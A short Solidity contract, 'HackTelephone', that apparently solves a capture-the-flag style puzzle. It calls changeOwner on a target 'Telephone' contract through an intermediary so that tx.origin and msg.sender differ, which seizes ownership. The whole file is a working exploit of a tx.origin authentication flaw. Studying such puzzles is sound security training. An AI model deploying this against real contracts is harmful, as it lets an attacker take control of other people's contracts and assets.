// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract HackTelephone {
    function attack(address _target) external {
        ITelephone target = ITelephone(_target);
        target.changeOwner(msg.sender);
    }
}
